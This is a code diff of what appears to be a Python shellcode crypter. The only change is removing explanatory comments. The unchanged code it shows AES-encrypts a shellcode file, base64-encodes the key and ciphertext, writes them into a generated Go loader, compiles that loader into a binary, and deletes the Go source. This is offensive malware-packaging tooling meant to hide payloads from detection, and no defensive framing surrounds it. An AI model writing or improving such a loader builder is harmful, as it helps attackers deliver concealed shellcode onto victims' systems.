@@ -12,7 +12,7 @@ def encrypt_shellcode(shellcode_path, key):
 
     cipher = AES.new(key, AES.MODE_CBC)
     encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))
-    # Combine IV and encrypted shellcode before encoding
+
     encrypted_data = cipher.iv + encrypted_shellcode
     encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')
     return encrypted_data_base64
@@ -170,21 +170,16 @@ def main():
         print("[-] Error: Missing required arguments.")
         sys.exit(1)
 
-    # AES key generation (256-bit key)
     aes_key = os.urandom(32)
 
-    # Encrypt shellcode (IV + ciphertext combined)
     encrypted_shellcode = encrypt_shellcode(shellcode_file, aes_key)
     aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')
 
-    # Write Go loader
     go_file_path = os.path.join(os.getcwd(), "loader.go")
     create_go_loader(encrypted_shellcode, aes_key_b64, go_file_path)
 
-    # Compile Go loader
     compile_go_loader(go_file_path, output_file)
 
-    # Clean up
     if os.path.exists(go_file_path):
         os.remove(go_file_path)
 
